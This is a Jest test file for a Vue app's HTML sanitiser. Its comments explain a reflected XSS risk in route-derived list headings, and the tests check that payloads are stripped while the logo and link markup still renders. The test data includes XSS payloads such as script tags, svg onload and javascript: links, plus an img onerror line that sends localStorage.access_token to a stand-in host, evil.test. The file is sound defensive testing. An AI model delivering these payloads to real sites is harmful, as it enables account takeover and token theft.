/**
 * ListHeadingSection renders a heading built from ROUTE INPUT, so its v-html must escape.
 *
 * WHY: six pages feed this component data taken straight from the URL —
 *   pages/search.vue                     ← $route.query.q
 *   pages/activity/_username/index.vue   ← $route.params.username
 *   pages/_username/comments/index.vue   ← $route.params.username
 *   pages/_username/blog/index.vue       ← $route.params.username
 *   pages/_username/videos/index.vue     ← $route.params.username
 *   pages/_username/wallet.vue           ← $route.params.username
 * and no page in this repo declares a `validate()`, so route params are unconstrained.
 *
 * Unescaped, that is a REFLECTED XSS: one crafted link, no login, no chain write, and it
 * fires on the SSR response as well as after hydration. With the whole session in
 * localStorage on this origin and no CSP, that is a complete account takeover.
 *
 * It stays v-html because four callers legitimately pass a chain-logo <img> / info <a>.
 * These tests therefore pin BOTH halves of that bargain: dangerous markup is removed, and
 * the legitimate markup still survives — a sanitiser that stripped everything would pass a
 * security-only test while silently breaking the headings.
 */
import sanitizePlugin from '@/plugins/sanitize'

const load = () => {
  const injected = {}
  sanitizePlugin({ app: {} }, (name, fn) => { injected[name] = fn })
  return injected.sanitize
}

describe('ListHeadingSection heading sanitisation (client path)', () => {
  let sanitize
  beforeAll(() => { process.client = true; sanitize = load() })
  afterAll(() => { delete process.client })

  // Written as the attacker would deliver them: inside the heading string the page builds.
  const asHeading = (payload) => 'Search Results for "' + payload + '"'

  it.each([
    ['img onerror token beacon', `<img src=x onerror="fetch('https://evil.test/?t='+localStorage.access_token)">`],
    ['script tag', '<script>alert(1)<\/script>'],
    ['svg onload', '<svg onload=alert(1)>'],
    ['iframe', '<iframe src="https://evil.test/"><\/iframe>'],
    ['javascript: anchor', '<a href="javascript:alert(1)">x</a>'],
    ['onmouseover on a span', '<span onmouseover="alert(1)">hover</span>'],
    ['body onload', '<body onload=alert(1)>'],
  ])('removes %s from a route-derived heading', (_label, payload) => {
    const out = String(sanitize(asHeading(payload)))

    expect(out).not.toMatch(/\son[a-z]+\s*=/i)
    expect(out).not.toMatch(/<script/i)
    expect(out).not.toMatch(/javascript:/i)
    expect(out).not.toMatch(/<iframe/i)
    expect(out).not.toContain('evil.test')
  })

  it('keeps the surrounding heading text intact', () => {
    // The feature still has to work: a benign query must still show.
    const out = String(sanitize(asHeading('running shoes')))
    expect(out).toContain('Search Results for')
    expect(out).toContain('running shoes')
  })

  it('preserves the legitimate chain-logo markup four callers pass', () => {
    // pages/communities, explore, yieldfarming and the blog/videos titles rely on this.
    // If it were stripped, those headings would lose their logo and link.
    const legit = "Explore <img src='/img/HIVE.png' alt='HIVE' class='chain-logo'> <a href='/faq' target='_blank'>info</a>"
    const out = String(sanitize(legit))

    expect(out).toMatch(/<img/i)
    expect(out).toContain('/img/HIVE.png')
    expect(out).toMatch(/<a/i)
    expect(out).toContain('/faq')
  })
})

// NOT COVERED HERE: the SSR branch. $sanitize switches to sanitize-html when
// process.client is false, and that module does not load under this repo's jsdom test
// environment (no existing spec covers it either). The production code does route both
// paths through $sanitize - the plugin picks the branch - so the fix applies server-side;
// it is the TEST coverage that stops at the client path, not the mitigation. Worth
// closing with a node-environment spec (@jest-environment node) as a follow-up, since
// the reflected payload is present in the server-rendered HTML before hydration.
